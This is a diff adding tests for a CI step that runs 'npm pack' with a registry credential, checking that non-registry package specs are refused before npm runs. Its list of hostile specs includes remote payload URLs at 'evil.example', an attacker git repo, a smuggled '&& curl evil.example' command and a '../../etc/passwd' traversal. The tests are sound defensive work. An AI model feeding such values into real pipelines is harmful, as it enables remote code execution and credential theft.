@@ -294,6 +294,68 @@ test('the .npmrc holding the token is not world-readable', () => {
   )
 })
 
+// The step holds a GPR credential and several workflows forward a
+// workflow_dispatch value straight into package-version. `npm pack` accepts
+// non-registry specs (file:, git:, https:, github:, npm: aliases) and a git spec
+// would RUN prepare scripts from an arbitrary source. The workflow-level gate is
+// prefix-only, so every one of these satisfies it — the action must fail closed.
+const HOSTILE_SPECS = [
+  '@qvac/llm-llamacpp@file:/tmp/evil.tgz',
+  '@tetherto/x-mono@https://evil.example/payload.tgz',
+  '@qvac/a@git+ssh://git@evil.example/x.git',
+  '@tetherto/a-mono@github:attacker/repo',
+  '@qvac/a@npm:other-package@1.0.0',
+  '@evil/pkg@1.0.0',
+  '@qvac/a@1.0.0 && curl evil.example',
+  '../../etc/passwd',
+]
+
+for (const spec of HOSTILE_SPECS) {
+  test(`rejects a non-registry spec before invoking npm: ${spec}`, () => {
+    const run = runStep({ packageVersion: spec, force: 'true' })
+
+    assert.notEqual(run.status, 0, `must fail closed on ${spec}`)
+    assert.match(run.output, /Refusing to npm pack/)
+    assert.equal(
+      run.invocations,
+      '',
+      `npm must never be invoked for ${spec}`,
+    )
+    // No .npmrc, so the credential is never written for a rejected spec.
+    assert.equal(run.packDirExists, false)
+  })
+}
+
+// Every shape a real caller actually produces must still pass.
+const LEGITIMATE_SPECS = [
+  '@qvac/llm-llamacpp@0.46.0',
+  '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-33179656677',
+  '@tetherto/llm-llamacpp-mono@0.47.0-tmp.pr-3938.runid-33179656677',
+  '@qvac/llm-llamacpp@latest',
+  '@qvac/transcription-parakeet@1.0.0',
+]
+
+for (const spec of LEGITIMATE_SPECS) {
+  test(`accepts the real caller spec: ${spec}`, () => {
+    const run = runStep({ packageVersion: spec, force: 'true' })
+    assert.equal(run.status, 0, run.output)
+    assert.doesNotMatch(run.output, /Refusing to npm pack/)
+  })
+}
+
+test('accepts a bare dist-tag and an unscoped addon name', () => {
+  // inference-addon-cpp passes an UNSCOPED addon-npm-name and no package input,
+  // so its fallback spec is "inference-addon-cpp-mobile-tests@latest".
+  const unscoped = runStep({ addonName: 'inference-addon-cpp-mobile-tests' })
+  assert.equal(unscoped.status, 0, unscoped.output)
+  assert.match(unscoped.invocations, /spec=inference-addon-cpp-mobile-tests@latest/)
+
+  // Whisper/TTS-style callers wire a bare version through package-version.
+  const bare = runStep({ packageVersion: '1.4.0', force: 'true', npmEnv: { MOCK_NPM_VERSION: '1.4.0' } })
+  assert.equal(bare.status, 0, bare.output)
+  assert.match(bare.invocations, /spec=@qvac\/llm-llamacpp@1\.4\.0/)
+})
+
 test('a failed @tetherto resolve points at GitHub Packages, not npmjs.com', () => {
   const run = runStep({
     packageVersion: '@tetherto/llm-llamacpp-mono@0.0.0-nope',
